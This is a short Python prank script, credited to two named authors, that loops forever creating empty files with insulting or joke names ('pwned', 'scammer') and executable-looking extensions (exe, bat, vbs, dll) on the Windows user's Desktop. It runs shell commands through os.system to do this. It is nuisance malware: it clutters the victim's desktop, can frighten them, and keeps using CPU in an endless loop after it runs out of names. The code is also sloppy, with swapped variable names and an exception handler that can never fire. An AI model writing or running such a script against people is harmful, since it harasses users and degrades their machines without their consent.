#Created by 2Loop & CaptainBeluga
import random
import os
import time

#already generated file 
files = []

desk = "C:\\Users\\%username%\\Desktop\\"

extensions_list = ['pdf','txt','png','docx','xlsx','jpg','ini','pptx','dll','apk','mp4','zip','exe','mp3','dat','vbs','lnk','ogg','stl','fbx','iso','bat','cfg','md','dds','js','jpeg','png','html','css']
names_list = ['astri', 'beluga', 'XDDDD', '6969', 'fucked', 'imagine', 'defalt','watch-dogs','fortnite','vbuck-kid','scammer','pwned']

while True:

    #Generation process
    name = random.choice(extensions_list)
    extension = random.choice(names_list)

    result = f'{extension}.{name}'

    #Checking if the file already exists
    if(result not in files):
        
        try:
            os.system(f"echo off > {desk}/{result}")

        except Exception as e:
            print(e)
            desk = "C:\\Users\\%username%\\OneDrive\\Desktop\\"
            os.system(f"echo off > {desk}/{result}")

        files.append(result)

        print(f'[+] File generated > {result}')